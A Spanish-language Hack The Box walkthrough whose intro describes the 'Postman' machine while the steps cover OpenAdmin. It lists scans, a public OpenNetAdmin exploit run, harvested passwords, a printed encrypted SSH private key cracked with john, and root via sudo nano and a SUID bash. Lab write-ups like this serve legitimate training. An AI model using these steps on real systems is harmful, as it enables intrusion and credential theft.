-- -
- Tags: #ejptmachine #metasploit #id_rsa #curl 
--- -
### ¿Qué habilidades puedes practicar con Postman?

1. **Reconocimiento y escaneo de puertos:**
    - Al igual que en la mayoría de las máquinas de Hack The Box, el primer paso es realizar un **escaneo de puertos** para identificar los servicios y puertos abiertos. Utilizando herramientas como **Nmap** podrás obtener una visión clara de los servicios disponibles, lo que te permitirá planificar tu ataque.
2. **Explotación de vulnerabilidades web:**
    - En **Postman**, uno de los principales vectores de ataque es una vulnerabilidad en una aplicación web. Deberás realizar un **reconocimiento web** exhaustivo para identificar posibles **vulnerabilidades** como **inyección SQL (SQLi)**, **cross-site scripting (XSS)**, o **autenticación débil**.
    - Este tipo de vulnerabilidad te permitirá obtener acceso al sistema o **obtener credenciales** que te ayuden en etapas posteriores del proceso.
3. **Escalada de privilegios en Linux:**
    - Una vez que consigas acceso inicial al sistema, tendrás que realizar una **escalada de privilegios** para obtener privilegios más altos en el sistema **Linux**. Buscarás **permisos incorrectos** en archivos importantes o configuraciones erróneas en servicios que puedan permitirte elevar tus privilegios.
    - También es común que se necesite **abuso de configuraciones de Sudo** o el aprovechamiento de **vulnerabilidades locales** para lograr la escalada.
---

https://khaoticdev.net/hack-the-box-openadmin/
https://atalaysblog.wordpress.com/2020/05/02/hackthebox-openadmin/

`nmap -p- --min-rate 5000 -sCV -n 10.10.10.171 -oN portScan`
![Pasted image 20241217232426](../../Fotos/Pasted%20image%2020241217232426.png)
![Pasted image 20241217232557](../../Fotos/Pasted%20image%2020241217232557.png)
Inspeccionamos la pagina
![Pasted image 20241217232809](../../Fotos/Pasted%20image%2020241217232809.png)

`gobuster dir -u http://10.10.10.171 -w /usr/share/SecLists/Discovery/Web-Content/common.txt`
![Pasted image 20241217234711](../../Fotos/Pasted%20image%2020241217234711.png)
artwork
![Pasted image 20241217235006](../../Fotos/Pasted%20image%2020241217235006.png)
music
![Pasted image 20241217235117](../../Fotos/Pasted%20image%2020241217235117.png)
Ingresamos en login
![Pasted image 20241217235243](../../Fotos/Pasted%20image%2020241217235243.png)
Click en DNS Domains ya que aparece 1
![Pasted image 20241217235548](../../Fotos/Pasted%20image%2020241217235548.png)
Lo agregamos a nuestro /etc/hosts
![Pasted image 20241217235641](../../Fotos/Pasted%20image%2020241217235641.png)
Damos donde dice download y aparece una versión a actualizar y si vemos arriba de download aparece la versión actual por ende tenemos opennetadmin v18.1.1
![Pasted image 20241218000025](../../Fotos/Pasted%20image%2020241218000025.png)

![Pasted image 20241218000933](../../Fotos/Pasted%20image%2020241218000933.png)

![Pasted image 20241219163959](../../Fotos/Pasted%20image%2020241219163959.png)

![Pasted image 20241219164402](../../Fotos/Pasted%20image%2020241219164402.png)

![Pasted image 20241219164410](../../Fotos/Pasted%20image%2020241219164410.png)

![Pasted image 20241219164431](../../Fotos/Pasted%20image%2020241219164431.png)

Sin éxito pasamos al siguiente formato .sh

-----------
### Intento 2

.sh
![Pasted image 20241218000933](../../Fotos/Pasted%20image%2020241218000933.png)

![Pasted image 20241219165458](../../Fotos/Pasted%20image%2020241219165458.png)

`rlwrap ./47691.sh http://10.10.10.171/ona/`

![Pasted image 20241219165515](../../Fotos/Pasted%20image%2020241219165515.png)

No podemos movernos libremente pero con ls podemos leer contenido: si hacemos un tratamiento de la shell podríamos quizás movernos libremente

![Pasted image 20241219174314](../../Fotos/Pasted%20image%2020241219174314.png)

![Pasted image 20241219175542](../../Fotos/Pasted%20image%2020241219175542.png)

![Pasted image 20241219173542](../../Fotos/Pasted%20image%2020241219173542.png)

![Pasted image 20241219173701](../../Fotos/Pasted%20image%2020241219173701.png)
- Obtenemos potenciales credenciales de base de datos
n1nj4W4rri0R!

![Pasted image 20241219174450](../../Fotos/Pasted%20image%2020241219174450.png)

`Maquina Vulnerada Parcialmente` Jimmy
Atentos a los grupos, como jimmy somos grupo internal y lo necesitabamos por lo menos para poder entrar a /var/www/internal

![Pasted image 20241219174627](../../Fotos/Pasted%20image%2020241219174627.png)
- Potencial credencial para joanna

Revisaremos los archivos de configuración de webserver apache, vemos que la configuracion para var/www/internal se ejecuta bajo el puerto 52846 localmente
![Pasted image 20241219175005](../../Fotos/Pasted%20image%2020241219175005.png)
 - AssignUserIDComo han asignado al usuario joanna quien administre el servidor web todos los comandos que se ejecuten serán como joanna
 
`curl http://127.0.0.1:52846 `
![Pasted image 20241219180125](../../Fotos/Pasted%20image%2020241219180125.png)

- Vemos contenido

Me cree un archivo en /var/www/internal y le di permisos 777 a burst.php 
![Pasted image 20241219181345](../../Fotos/Pasted%20image%2020241219181345.png)

`curl localhost:52846/burst.php`
- Si hacemos un curl al localhost y apuntamos al archivo creado con el comando lo estariamos efectivamente ejecutando como joanna
![Pasted image 20241219181617](../../Fotos/Pasted%20image%2020241219181617.png)

main.php Vemos que si apuntamos ala direccion de hoanna podremos ver su id_rsa
![Pasted image 20241219181710](../../Fotos/Pasted%20image%2020241219181710.png)

`curl localhost:52846/main.php `
![Pasted image 20241219182807](../../Fotos/Pasted%20image%2020241219182807.png)

```txt
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```

La ida rsa dice el encavezado PROC ENCRYPTEC pide la clave de la propia rsa y no del usuario joanna por lo que usaremos recursos como ssh2john para desencriptarla

La pasamos a nuestra maquina
![Pasted image 20241219184311](../../Fotos/Pasted%20image%2020241219184311.png)

Estraemos el hash (porque esta encriptada la id_rsa solo por eso en este caso puntual)
![Pasted image 20241219190337](../../Fotos/Pasted%20image%2020241219190337.png)
`/opt/john/run/ssh2john.py id_rsa > hash`
![Pasted image 20241219190427](../../Fotos/Pasted%20image%2020241219190427.png)

`john --wordlist=/usr/share/wordlists/rockyou.txt hash`
![Pasted image 20241219190523](../../Fotos/Pasted%20image%2020241219190523.png)
bloodninjas clave id_rsa

Ahora nos conectaremos como el usuario joanna y nos pedira la clave de la id rsa que ya la tenemos
`ssh -i id_rsa joanna@10.10.10.171`
![Pasted image 20241219190727](../../Fotos/Pasted%20image%2020241219190727.png)
ingresamos la clave crackeada y ya tenemos acceso como joanna
![Pasted image 20241219190735](../../Fotos/Pasted%20image%2020241219190735.png)

`Maquina Vulnerada`

![Pasted image 20241219191118](../../Fotos/Pasted%20image%2020241219191118.png)

User Flag: 8c87500d63389612fb76c4ee9fd0ebbd

---

*Escalada de Privilegios*

![Pasted image 20241219191237](../../Fotos/Pasted%20image%2020241219191237.png)

Como tenemos el binario nano y el recurso priv
utilizaremos el nano para poder abrirlo
`sudo -u root nano /opt/priv`
![Pasted image 20241219193032](../../Fotos/Pasted%20image%2020241219193032.png)
CTR+R
CTR+X
![Pasted image 20241219193049](../../Fotos/Pasted%20image%2020241219193049.png)
Command to execute
![Pasted image 20241219193152](../../Fotos/Pasted%20image%2020241219193152.png)

Le daremos permisos SUID a la bin bash para poder ejectuar comandos
![Pasted image 20241219195548](../../Fotos/Pasted%20image%2020241219195548.png)

![Pasted image 20241219195632](../../Fotos/Pasted%20image%2020241219195632.png)

`bash -p`
- Esto permite ejecutar bajo los persmiso SUID el binario bash de manera temporal y ya seriamos usuario root
![Pasted image 20241219195838](../../Fotos/Pasted%20image%2020241219195838.png)

![Pasted image 20241219200007](../../Fotos/Pasted%20image%2020241219200007.png)

Root Flag: 7892301ec4321f02db1b54f007666fad

---

Preguntas

clave interna de joana?
ni idea volver a ver mas adelante

